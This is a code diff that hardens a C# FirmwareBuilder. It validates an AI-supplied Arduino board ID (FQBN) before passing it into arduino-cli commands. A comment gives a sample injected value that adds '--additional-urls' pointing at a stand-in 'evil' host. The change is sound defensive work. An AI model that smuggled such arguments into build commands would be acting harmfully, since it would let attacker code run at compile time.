@@ -79,7 +79,11 @@ public static class FirmwareBuilder
         if (inferred is not null) return inferred;
 
         var board = (p.Firmware.Board ?? "").Trim();
-        if (board.Count(c => c == ':') == 2) return board;   // explicit FQBN for an unrecognised chip
+        // Honor an explicit FQBN for an unrecognised chip, but ONLY when it's a clean, valid FQBN — the board
+        // hint is AI-controlled and flows into `arduino-cli compile --fqbn {fqbn}`, so a value with embedded
+        // spaces/flags (e.g. "...uno --additional-urls http://evil") could inject an attacker package index and
+        // run code at compile time. IsValidFqbn rejects anything but vendor:arch:board[:menu] tokens.
+        if (board.Count(c => c == ':') == 2 && IsValidFqbn(board)) return board;
         return "arduino:avr:uno";   // safe default (smallest core)
     }
 
@@ -108,6 +112,10 @@ public static class FirmwareBuilder
             }
 
             var fqbn = Fqbn(project);
+            // Defense in depth: the FQBN is interpolated into the arduino-cli command line — never pass an
+            // unvalidated value (Fqbn already sanitises, but guard the exec site against any future regression).
+            if (!IsValidFqbn(fqbn))
+                return new BuildResult(true, true, false, $"Refusing to compile — unsafe board id '{fqbn}'.", Array.Empty<BuildDiagnostic>());
             await EnsureCoreAsync(cli, fqbn, ct);   // install the board core on first use for this vendor
             Diagnostics.AppLog.Info("build", $"compiling firmware · {fqbn}");
             var run = await Diagnostics.ProcessRunner.RunAsync(cli,
@@ -164,6 +172,9 @@ public static class FirmwareBuilder
                 }
             }
 
+            if (!IsValidFqbn(fqbn))   // defense in depth: never interpolate an unvalidated board id into the CLI
+                return new CompiledImage(false, fqbn, null, null, null, outputDir,
+                    new[] { new BuildDiagnostic("error", "", 0, $"Refusing to compile — unsafe board id '{fqbn}'.") });
             await EnsureCoreAsync(cli, fqbn, ct);
             Diagnostics.AppLog.Info("build", $"building firmware image · {fqbn}");
             var run = await Diagnostics.ProcessRunner.RunAsync(cli,
